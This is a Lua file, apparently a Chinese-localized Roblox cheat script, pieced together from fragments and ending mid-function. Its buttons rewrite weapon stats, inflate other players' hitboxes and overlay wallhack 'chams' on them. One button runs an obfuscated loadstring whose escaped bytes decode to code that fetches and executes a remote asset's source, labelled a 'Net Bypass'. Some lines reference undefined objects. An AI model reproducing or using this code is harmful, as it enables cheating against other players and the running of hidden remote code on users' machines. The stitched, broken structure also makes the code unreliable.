KrewTempOpen.Size = UDim2.new(0.533831894, 0, 0.506991863, 0)

Name.Name = "Name"
Name.Parent = KrewTempOpen
Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Name.BackgroundTransparency = 1.000
Name.Size = UDim2.new(0.245568082, 0, 0.0833867863, 0)
Name.Font = Enum.Font.SourceSans
Name.Text = "👉兵工厂👌" -- put the gui name here
Name.TextColor3 = Color3.fromRGB(255, 255, 255)
Name.TextSize = 16.000

Line.Name = "Line"
Line.Parent = KrewTempOpen
Line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Line.BackgroundTransparency = 1.000
Line.Position = UDim2.new(0.0978987217, 0, 0.0416933969, 0)
Line.Size = UDim2.new(0.0476846658, 0, 0.0833867863, 0)
Line.Font = Enum.Font.SourceSans
Line.Text = "”””””””””””" -- change if u dont want questionmarks
Line.TextColor3 = Color3.fromRGB(30, 30, 30)
Line.TextSize = 14.000

ScrollingFrame.Parent = KrewTempOpen
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
ScrollingFrame.BackgroundTransparency = 0.900
ScrollingFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
ScrollingFrame.Position = UDim2.new(0.0450695045, 0, 0.253367454, 0)
ScrollingFrame.Size = UDim2.new(0.928037941, 0, 0.683130264, 0)

UICorner.Parent = ScrollingFrame

Function1.Name = "Function1"
Function1.Parent = ScrollingFrame
Function1.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function1.Position = UDim2.new(0.0397513807, 0, 0.0140820052, 0)
Function1.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function1.Font = Enum.Font.SourceSans
Function1.Text = "枪" -- function one (attack and shit)
Function1.TextColor3 = Color3.fromRGB(0, 0, 0)
Function1.TextSize = 14.000
Function1.MouseButton1Down:Connect(function()
  local replicationstorage = game.ReplicatedStorage

for i, v in pairs(replicationstorage.Weapons:GetDescendants()) do
   if v.Name == "Auto" then
       v.Value = true
   end
   if v.Name == "RecoilControl" then
       v.Value = 0
   end
   if v.Name == "MaxSpread" then
       v.Value = 0
   end
   if v.Name == "ReloadTime" then
      v.Value = 1
   end
   if v.Name == "FireRate" then
       v.Value = 0.05
   end
   if v.Name == "Crit" then
       v.Value = 20
   end
end
end)

UICorner_2.Parent = Function1

Function2.Name = "Function2"
Function2.Parent = ScrollingFrame
Function2.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function2.Position = UDim2.new(0.0397513807, 0, 0.103883162, 0)
Function2.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function2.Font = Enum.Font.SourceSans
Function2.Text = "彩虹枪皮肤" -- function 2 (attack and shit)
Function2.TextColor3 = Color3.fromRGB(0, 0, 0)
Function2.TextSize = 14.000
Function2.MouseButton1Down:Connect(function()
  local c = 1 function zigzag(X)  return math.acos(math.cos(X * math.pi)) / math.pi end game:GetService("RunService").RenderStepped:Connect(function()  if game.Workspace.Camera:FindFirstChild('Arms') then   for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    if v.ClassName == 'MeshPart' then      v.Color = Color3.fromHSV(zigzag(c),1,1)     c = c + .0001    end   end  end end)
end)

UICorner_3.Parent = Function2

Function3.Name = "Function3"
Function3.Parent = ScrollingFrame
Function3.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function3.Position = UDim2.new(0.0397513807, 0, 0.195287913, 0)
Function3.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function3.Font = Enum.Font.SourceSans
Function3.Text = "瞄准" -- function 3 (attack and shit)
Function3.TextColor3 = Color3.fromRGB(0, 0, 0)
Function3.TextSize = 14.000
Function3.MouseButton1Down:Connect(function()
  function getplrsname()
for i,v in pairs(game:GetChildren()) do
if v.ClassName == "Players" then
return v.Name
end
end
end
local players = getplrsname()
local plr = game[players].LocalPlayer
coroutine.resume(coroutine.create(function()
while wait(1) do
coroutine.resume(coroutine.create(function()
for _,v in pairs(game[players]:GetPlayers()) do
if v.Name ~= plr.Name and v.Character then
v.Character.HeadHB.CanCollide = false
v.Character.HeadHB.Transparency = 10
v.Character.HeadHB.Size = Vector3.new(100,100,100)
v.Character.HumanoidRootPart.CanCollide = false
v.Character.HumanoidRootPart.Transparency = 10
v.Character.HumanoidRootPart.Size = Vector3.new(100,100,100)
end
end
end))
end
end))
function CreateSG(name,parent,face)
local SurfaceGui = Instance.new("SurfaceGui",parent)
SurfaceGui.Parent = parent
SurfaceGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
SurfaceGui.Face = Enum.NormalId[face]
SurfaceGui.LightInfluence = 0
SurfaceGui.ResetOnSpawn = false
SurfaceGui.Name = name
SurfaceGui.AlwaysOnTop = true
local Frame = Instance.new("Frame",SurfaceGui)
Frame.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
Frame.Size = UDim2.new(1,0,1,0)
end
while wait(1) do
for i,v in pairs (game:GetService("Players"):GetPlayers()) do
if v ~= game:GetService("Players").LocalPlayer and v.Character ~= nil and
v.Character:FindFirstChild("LowerTorso") and v.Character.LowerTorso:FindFirstChild("cham") == nil then
for i,v in pairs (v.Character:GetChildren()) do
if v:IsA("MeshPart") or v.Name == "LowerTorso" then
CreateSG("cham",v,"Back")
CreateSG("cham",v,"Front")
CreateSG("cham",v,"Left")
CreateSG("cham",v,"Right")
CreateSG("cham",v,"Right")
CreateSG("cham",v,"Top")
CreateSG("cham",v,"Bottom")
end
end
end
end
end
end)

UICorner_4.Parent = Function3

Function4.Name = "Function4"
Function4.Parent = ScrollingFrame
Function4.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function4.Position = UDim2.new(0.0397513807, 0, 0.283485472, 0)
Function4.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function4.Font = Enum.Font.SourceSans
Function4.Text = "速度" -- function 4 (attack and shit)
Function4.TextColor3 = Color3.fromRGB(0, 0, 0)
Function4.TextSize = 14.000
Function4.MouseButton1Down:Connect(function()
  net = true -- if false = do nothing
notify = true -- set this to false if u don't want to see notiflication


loadstring("\13\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\71\101\116\79\98\106\101\99\116\115\40\34\114\98\120\97\115\115\101\116\105\100\58\47\47\55\50\53\55\55\54\49\55\56\53\34\41\91\49\93\46\83\111\117\114\99\101\41\40\41\13\10")()

wait(0)
game.StarterGui:SetCore("SendNotification", {
Title = "âœ…!";
Text = "Net Bypass Activated.";
})
end)

UICorner_11.Parent = Function10

CredsDontRemove.Name = "CredsDontRemove" --dont remove or change the credits from the template
CredsDontRemove.Parent = KrewTempOpen
CredsDontRemove.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CredsDontRemove.BackgroundTransparency = 1.000
CredsDontRemove.Position = UDim2.new(0.311960489, 0, 0.16607289, 0)
CredsDontRemove.Size = UDim2.new(0.392178982, 0, 0.0609364994, 0)
CredsDontRemove.Font = Enum.Font.SourceSans
CredsDontRemove.Text = "繁星汉化 " --dont change this (leave my credits)
CredsDontRemove.TextColor3 = Color3.fromRGB(120, 120, 120)
CredsDontRemove.TextSize = 14.000

Close.Name = "Close"
Close.Parent = KrewTempOpen
Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Close.BackgroundTransparency = 1.000
Close.Position = UDim2.new(0.909142137, 0, 0.00320718414, 0)
Close.Size = UDim2.new(0.0908579305, 0, 0.0801796019, 0)
Close.Font = Enum.Font.SourceSans
Close.Text = "X" -- change if u dont want questionmarks
Close.TextColor3 = Color3.fromRGB(255, 255, 255)
Close.TextSize = 14.000

TempByKrew.Name = "TempBy$Krew"
TempByKrew.Parent = KrewTemplate
TempByKrew.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TempByKrew.Position = UDim2.new(0.567761779, 0, 0.979447246, 0)
TempByKrew.Size = UDim2.new(0.214157432, 0, 0.0168804135, 0)
TempByKrew.Visible = false

TextButton.Parent = TempByKrew
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Size = UDim2.new(0.935741007, 0, 0.96325624, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "    â–º" -- change if u dont want questionmarks
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14.000
TextButton.TextXAlignment = Enum.TextXAlignment.Left

-- Scripts (dont touch):

local function EEYCAWA_fake_script() -- Close.Script 
	local script = Instance.new('Script', Close)

	local frame = script.Parent.Parent.Parent["$KrewTempOpen"]
	
	
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == true then
			frame.Visible = false
			frame.Parent["TempBy$Krew"].Visible = true
		end
	end)
end
coroutine.wrap(EEYCAWA_fake_script)()
local function VLRJSU_fake_script() -- KrewTempOpen.LocalScript 
	local script = Instance.new('LocalScript', KrewTempOpen)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
end

game.StarterGui:SetCore("SendNotification",  {
 Title = "Script is made by G.A.X.P";
 Text = "discord.gg/JPTv7JkG8g";
 Icon = ""; -- dont touch this, if u want to add ur own notification just do this:
 Duration = 5;
})

coroutine.wrap(VLRJSU_fake_script)()
local function RKEF_fake_script() -- TextButton.Script 
	local script = Instance.new('Script', TextButton)

	local frame = script.Parent.Parent.Parent["$KrewTempOpen"]
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == false then
			frame.Visible = true
			script.Parent.Parent.Parent["TempBy$Krew"].Visible = false
		end
	end)
end
coroutine.wrap(RKEF_fake_script)()
local function XSRGC_fake_script() -- TempByKrew.LocalScript 
	local script = Instance.new('LocalScript', TempByKrew)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
end
coroutine.wrap(XSRGC_fake_script)()
end)
local tool = creds:section("范围",true)
tool:Button("（13）",function()
        	_G.HeadSize = 13
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
end)

tool:Button("（20）",function()
        	_G.HeadSize = 20
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
end)
tool:Button("（30）",function()
        	_G.HeadSize = 30
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
end)
repeat task.wait() until game:IsLoaded()
local library = {}
local ToggleUI = false
library.currentTab = nil
library.flags = {}

local services = setmetatable({}, {
  __index = function(t, k)
    return game.GetService(game, k)
  end
})

local mouse = services.Players.LocalPlayer:GetMouse()

function Tween(obj, t, data)
	services.TweenService:Create(obj, TweenInfo.new(t[1], Enum.EasingStyle[t[2]], Enum.EasingDirection[t[3]]), data):Play()
	return true
end

function Ripple(obj)
	spawn(function()
		if obj.ClipsDescendants ~= true then
			obj.ClipsDescendants = true
		end
		local Ripple = Instance.new("ImageLabel")
		Ripple.Name = "Ripple"
		Ripple.Parent = obj
		Ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Ripple.BackgroundTransparency = 1.000
		Ripple.ZIndex = 8
		Ripple.Image = "rbxassetid://2708891598"
		Ripple.ImageTransparency = 0.800
		Ripple.ScaleType = Enum.ScaleType.Fit
		Ripple.ImageColor3 = Color3.fromRGB(255, 255, 255)
		Ripple.Position = UDim2.new((mouse.X - Ripple.AbsolutePosition.X) / obj.AbsoluteSize.X, 0, (mouse.Y - Ripple.AbsolutePosition.Y) / obj.AbsoluteSize.Y, 0)
		Tween(Ripple, {.3, 'Linear', 'InOut'}, {Position = UDim2.new(-5.5, 0, -5.5, 0), Size = UDim2.new(12, 0, 12, 0)})
		wait(0.15)
		Tween(Ripple, {.3, 'Linear', 'InOut'}, {ImageTransparency = 1})
		wait(.3)
		Ripple:Destroy()
	end)
end

local toggled = false

-- # Switch Tabs # --
local switchingTabs = false
function switchTab(new)
  if switchingTabs then return end
  local old = library.currentTab
  if old == nil then
    new[2].Visible = true
    library.currentTab = new
    services.TweenService:Create(new[1], TweenInfo.new(0.1), {ImageTransparency = 0}):Play()
    services.TweenService:Create(new[1].TabText, TweenInfo.new(0.1), {TextTransparency = 0}):Play()
    return
  end
  
  if old[1] == new[1] then return end
  switchingTabs = true
  library.currentTab = new

  services.TweenService:Create(old[1], TweenInfo.new(0.1), {ImageTransparency = 0.2}):Play()
  services.TweenService:Create(new[1], TweenInfo.new(0.1), {ImageTransparency = 0}):Play()
  services.TweenService:Create(old[1].TabText, TweenInfo.new(0.1), {TextTransparency = 0.2}):Play()
  services.TweenService:Create(new[1].TabText, TweenInfo.new(0.1), {TextTransparency = 0}):Play()

  old[2].Visible = false
  new[2].Visible = true
  
  task.wait(0.1)

  switchingTabs = false
end

-- # Drag, Stolen from Kiriot or Wally # --
function drag(frame, hold)
	if not hold then
		hold = frame
	end
	local dragging
	local dragInput
	local dragStart
	local startPos

	local function update(input)
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end

	hold.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end)

	services.UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end

function library.new(library, name,theme)
    for _, v in next, services.CoreGui:GetChildren() do
        if v.Name == "frosty" then
          v:Destroy()
        end
      end
if theme == 'dark' then
    MainColor = Color3.fromRGB(25, 25, 25)
    Background = Color3.fromRGB(25, 25, 25)
    zyColor= Color3.fromRGB(25, 25, 25)
    beijingColor = Color3.fromRGB(25, 25, 25)
    else
    MainColor = Color3.fromRGB(25, 25, 25)
    Background = Color3.fromRGB(25, 25, 25)
    zyColor= Color3.fromRGB(30, 30, 30)
    beijingColor = Color3.fromRGB(255, 255, 255)
end
      local dogent = Instance.new("ScreenGui")
      local Main = Instance.new("Frame")
      local TabMain = Instance.new("Frame")
      local MainC = Instance.new("UICorner")
      local SB = Instance.new("Frame")
      local SBC = Instance.new("UICorner")
      local Side = Instance.new("Frame")
      local SideG = Instance.new("UIGradient")
      local TabBtns = Instance.new("ScrollingFrame")
      local TabBtnsL = Instance.new("UIListLayout")
      local ScriptTitle = Instance.new("TextLabel")
      local SBG = Instance.new("UIGradient") 
      local Open = Instance.new("TextButton")
      local UIG=Instance.new("UIGradient")
      local DropShadowHolder = Instance.new("Frame")
      local DropShadow = Instance.new("ImageLabel")
      local UICornerMain = Instance.new("UICorner")
      local UIGradient=Instance.new("UIGradient")
      local UIGradientTitle=Instance.new("UIGradient")
      
      if syn and syn.protect_gui then syn.protect_gui(dogent) end
    
      dogent.Name = "frosty"
      dogent.Parent = services.CoreGui
      
      function UiDestroy()
          dogent:Destroy()
      end
      
          function ToggleUILib()
            if not ToggleUI then
                dogent.Enabled = false
                ToggleUI = true
                else
                ToggleUI = false
                dogent.Enabled = true
            end
        end
      
      Main.Name = "Main"
      Main.Parent = dogent
      Main.AnchorPoint = Vector2.new(0.5, 0.5)
      Main.BackgroundColor3 = Background
      Main.BorderColor3 = MainColor
      Main.Position = UDim2.new(0.5, 0, 0.5, 0)
      Main.Size = UDim2.new(0, 572, 0, 353)
      Main.ZIndex = 1
      Main.Active = true
      Main.Draggable = true
      services.UserInputService.InputEnded:Connect(function(input)
      if input.KeyCode == Enum.KeyCode.LeftControl then
      if Main.Visible == true then
      Main.Visible = false else
      Main.Visible = true
      end
      end
      end)
      drag(Main)
      
      UICornerMain.Parent = Main
      UICornerMain.CornerRadius = UDim.new(0,3)
      
      DropShadowHolder.Name = "DropShadowHolder"
      DropShadowHolder.Parent = Main
      DropShadowHolder.BackgroundTransparency = 1.000
      DropShadowHolder.BorderSizePixel = 0
      DropShadowHolder.Size = UDim2.new(1, 0, 1, 0)
      DropShadowHolder.BorderColor3 = Color3.fromRGB(255,255,255)
      DropShadowHolder.ZIndex = 0

      DropShadow.Name = "DropShadow"
      DropShadow.Parent = DropShadowHolder
      DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
      DropShadow.BackgroundTransparency = 1.000
      DropShadow.BorderSizePixel = 0
      DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
      DropShadow.Size = UDim2.new(1, 43, 1, 43)
      DropShadow.ZIndex = 0
      DropShadow.Image = "rbxassetid://6015897843"
      DropShadow.ImageColor3 = Color3.fromRGB(255,255,255)
      DropShadow.ImageTransparency = 0.500
      DropShadow.ScaleType = Enum.ScaleType.Slice
      DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)


      UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.10, Color3.fromRGB(255, 127, 0)), ColorSequenceKeypoint.new(0.20, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.30, Color3.fromRGB(0, 255, 0)), ColorSequenceKeypoint.new(0.40, Color3.fromRGB(0, 255, 255)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.60, Color3.fromRGB(139, 0, 255)), ColorSequenceKeypoint.new(0.70, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.80, Color3.fromRGB(255, 127, 0)), ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 255, 0))}
      UIGradient.Parent = DropShadow

      local TweenService = game:GetService("TweenService")
      local tweeninfo = TweenInfo.new(7, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
      local tween = TweenService:Create(UIGradient, tweeninfo, {Rotation = 360})
      tween:Play()

          function toggleui()
            toggled = not toggled
            spawn(function()
                if toggled then wait(0.3) end
            end)
            Tween(Main, {0.3, 'Sine', 'InOut'}, {
                Size = UDim2.new(0, 609, 0, (toggled and 505 or 0))
            })
        end
      
      TabMain.Name = "TabMain"
      TabMain.Parent = Main
      TabMain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      TabMain.BackgroundTransparency = 1.000
      TabMain.Position = UDim2.new(0.217000037, 0, 0, 3)
      TabMain.Size = UDim2.new(0, 448, 0, 353)
      
      MainC.CornerRadius = UDim.new(0, 5.5)
      MainC.Name = "MainC"
      MainC.Parent = Frame
      
      SB.Name = "SB"
      SB.Parent = Main
      SB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      SB.BorderColor3 = MainColor
      SB.Size = UDim2.new(0, 8, 0, 353)
      
      SBC.CornerRadius = UDim.new(0, 6)
      SBC.Name = "SBC"
      SBC.Parent = SB
      
      Side.Name = "Side"
      Side.Parent = SB
      Side.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      Side.BorderColor3 = Color3.fromRGB(255, 255, 255)
      Side.BorderSizePixel = 0
      Side.ClipsDescendants = true
      Side.Position = UDim2.new(1, 0, 0, 0)
      Side.Size = UDim2.new(0, 110, 0, 353)
      
      SideG.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, zyColor), ColorSequenceKeypoint.new(1.00, zyColor)}
      SideG.Rotation = 90
      SideG.Name = "SideG"
      SideG.Parent = Side
      
      TabBtns.Name = "TabBtns"
      TabBtns.Parent = Side
      TabBtns.Active = true
      TabBtns.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      TabBtns.BackgroundTransparency = 1.000
      TabBtns.BorderSizePixel = 0
      TabBtns.Position = UDim2.new(0, 0, 0.0973535776, 0)
      TabBtns.Size = UDim2.new(0, 110, 0, 318)
      TabBtns.CanvasSize = UDim2.new(0, 0, 1, 0)
      TabBtns.ScrollBarThickness = 0
      
      TabBtnsL.Name = "TabBtnsL"
      TabBtnsL.Parent = TabBtns
      TabBtnsL.SortOrder = Enum.SortOrder.LayoutOrder
      TabBtnsL.Padding = UDim.new(0, 12)
      
      ScriptTitle.Name = "ScriptTitle"
      ScriptTitle.Parent = Side
      ScriptTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      ScriptTitle.BackgroundTransparency = 1.000
      ScriptTitle.Position = UDim2.new(0, 0, 0.00953488424, 0)
      ScriptTitle.Size = UDim2.new(0, 102, 0, 20)
      ScriptTitle.Font = Enum.Font.GothamSemibold
      ScriptTitle.Text = name
      ScriptTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
      ScriptTitle.TextSize = 14.000
      ScriptTitle.TextScaled = true
      ScriptTitle.TextXAlignment = Enum.TextXAlignment.Left
      
      UIGradientTitle.Parent = ScriptTitle
     
      local function NPLHKB_fake_script() 
        local script = Instance.new('LocalScript', ScriptTitle)
     
        local button = script.Parent
        local gradient = button.UIGradient
        local ts = game:GetService("TweenService")
        local ti = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
        local offset = {Offset = Vector2.new(1, 0)}
        local create = ts:Create(gradient, ti, offset)
        local startingPos = Vector2.new(-1, 0)
        local list = {} 
        local s, kpt = ColorSequence.new, ColorSequenceKeypoint.new
        local counter = 0
        local status = "down" 
        gradient.Offset = startingPos
        local function rainbowColors()
            local sat, val = 255, 255 
            for i = 1, 10 do 
                local hue = i * 17 
                table.insert(list, Color3.fromHSV(hue / 255, sat / 255, val / 255))
            end
        end
        rainbowColors()
        gradient.Color = s({
            kpt(0, list[#list]),
            kpt(0.5, list[#list - 1]),
            kpt(1, list[#list - 2])
        })
        counter = #list
        local function animate()
            create:Play()
            create.Completed:Wait() 
            gradient.Offset = startingPos 
            gradient.Rotation = 180
            if counter == #list - 1 and status == "down" then
                gradient.Color = s({
                    kpt(0, gradient.Color.Keypoints[1].Value),
                    kpt(0.5, list[#list]), 
                    kpt(1, list[1]) 
                })
                counter = 1
                status = "up" 
            elseif counter == #list and status == "down" then 
                gradient.Color = s({
                    kpt(0, gradient.Color.Keypoints[1].Value),
                    kpt(0.5, list[1]),
                    kpt(1, list[2])
                })
                counter = 2
                status = "up"
            elseif counter <= #list - 2 and status == "down" then 
                gradient.Color = s({
                    kpt(0, gradient.Color.Keypoints[1].Value),
                    kpt(0.5, list[counter + 1]), 
                    kpt(1, list[counter + 2])
                })
                counter = counter + 2
                status = "up"
            end
            create:Play()
            create.Completed:Wait()
            gradient.Offset = startingPos
            gradient.Rotation = 0 
            if counter == #list - 1 and status == "up" then
                gradient.Color = s({ 
     
                    kpt(0, list[1]), 
                    kpt(0.5, list[#list]), 
                    kpt(1, gradient.Color.Keypoints[3].Value)
                })
                counter = 1
                status = "down"
            elseif counter == #list and status == "up" then
                gradient.Color = s({
                    kpt(0, list[2]),
                    kpt(0.5, list[1]), 
                    kpt(1, gradient.Color.Keypoints[3].Value)
                })
                counter = 2
                status = "down"
            elseif counter <= #list - 2 and status == "up" then
                gradient.Color = s({
                    kpt(0, list[counter + 2]), 
                    kpt(0.5, list[counter + 1]), 
                    kpt(1, gradient.Color.Keypoints[3].Value) 	
                })
                counter = counter + 2
                status = "down"
            end
            animate()
        end
        animate()
     
    end
    coroutine.wrap(NPLHKB_fake_script)()
      
      SBG.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, zyColor), ColorSequenceKeypoint.new(1.00, zyColor)}
      SBG.Rotation = 90
      SBG.Name = "SBG"
      SBG.Parent = SB
    
      TabBtnsL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        TabBtns.CanvasSize = UDim2.new(0, 0, 0, TabBtnsL.AbsoluteContentSize.Y + 18)
      end)
      Open.Name = "Open"
      Open.Parent = dogent
      Open.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
      Open.Position = UDim2.new(0.00829315186, 0, 0.31107837, 0)
      Open.Size = UDim2.new(0, 61, 0, 32)
      Open.Font = Enum.Font.SourceSans
      Open.Text = "隐藏/打开"
      Open.TextColor3 = Color3.fromRGB(255, 255, 255)
      Open.TextSize = 14.000
      Open.Active = true
      Open.Draggable = true
      Open.MouseButton1Click:Connect(function()
      Main.Visible = not Main.Visible
      end)
      UIG.Parent = Open
      local window = {}
      function window.Tab(window, name, icon)
        local Tab = Instance.new("ScrollingFrame")
        local TabIco = Instance.new("ImageLabel")
        local TabText = Instance.new("TextLabel")
        local TabBtn = Instance.new("TextButton")
        local TabL = Instance.new("UIListLayout")
    
        Tab.Name = "Tab"
        Tab.Parent = TabMain
        Tab.Active = true
        Tab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Tab.BackgroundTransparency = 1.000
        Tab.Size = UDim2.new(1, 0, 1, 0)
        Tab.ScrollBarThickness = 2
        Tab.Visible = false
        
        TabIco.Name = "TabIco"
        TabIco.Parent = TabBtns
        TabIco.BackgroundTransparency = 1.000
        TabIco.BorderSizePixel = 0
        TabIco.Size = UDim2.new(0, 24, 0, 24)
        TabIco.Image = ("rbxassetid://%s"):format((icon or 4370341699))
        TabIco.ImageTransparency = 0.2
        
        TabText.Name = "TabText"
        TabText.Parent = TabIco
        TabText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TabText.BackgroundTransparency = 1.000
        TabText.Position = UDim2.new(1.41666663, 0, 0, 0)
        TabText.Size = UDim2.new(0, 76, 0, 24)
        TabText.Font = Enum.Font.GothamSemibold
        TabText.Text = name
        TabText.TextColor3 = Color3.fromRGB(255, 255, 255)
        TabText.TextSize = 14.000
        TabText.TextXAlignment = Enum.TextXAlignment.Left
        TabText.TextTransparency = 0.2
        
        TabBtn.Name = "TabBtn"
        TabBtn.Parent = TabIco
        TabBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TabBtn.BackgroundTransparency = 1.000
        TabBtn.BorderSizePixel = 0
        TabBtn.Size = UDim2.new(0, 110, 0, 24)
        TabBtn.AutoButtonColor = false
        TabBtn.Font = Enum.Font.SourceSans
        TabBtn.Text = ""
        TabBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        TabBtn.TextSize = 14.000
        
        TabL.Name = "TabL"
        TabL.Parent = Tab
        TabL.SortOrder = Enum.SortOrder.LayoutOrder
        TabL.Padding = UDim.new(0, 4)  
    
        TabBtn.MouseButton1Click:Connect(function()
            spawn(function()
                Ripple(TabBtn)
            end)
          switchTab({TabIco, Tab})
        end)
    
        if library.currentTab == nil then switchTab({TabIco, Tab}) end
    
        TabL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
          Tab.CanvasSize = UDim2.new(0, 0, 0, TabL.AbsoluteContentSize.Y + 8)
        end)
    
        local tab = {}
        function tab.section(tab, name, TabVal)
          local Section = Instance.new("Frame")
          local SectionC = Instance.new("UICorner")
